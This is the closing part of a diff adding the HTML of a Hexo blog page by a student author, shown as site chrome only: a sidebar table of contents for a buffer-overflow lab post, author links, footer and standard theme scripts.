+    <a href="/2023/05/19/profile_en/" rel="next" title="Wang's Personal Resume">
+      Wang's Personal Resume <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C"><span class="nav-number">1.</span> <span class="nav-text">缓冲区溢出漏洞攻击实验</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">预备知识：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="nav-number">1.2.</span> <span class="nav-text">第一关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="nav-number">1.3.</span> <span class="nav-text">第二关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="nav-number">1.4.</span> <span class="nav-text">第三关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3"><span class="nav-number">1.5.</span> <span class="nav-text">第四关</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="小王(Comrade Wang)"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">小王(Comrade Wang)</p>
+  <div class="site-description" itemprop="description">喜欢造飞机、导弹和计算机的大学生 (A graduate student who enjoys buidling airplanes, missiles and computers)</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/csodyssey" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;csodyssey" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/wrq2021@nudt.edu.cn" title="E-Mail → wrq2021@nudt.edu.cn"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.zhihu.com/people/pu-ti-shan-cheng-zhu" title="知乎主页 → https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;pu-ti-shan-cheng-zhu" rel="noopener" target="_blank"><i class="fab fa-zhihu fa-fw"></i>知乎主页</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_44115917?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_44115917?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fab fa-csdn fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">小王(Comrade Wang)</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/three-waves.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
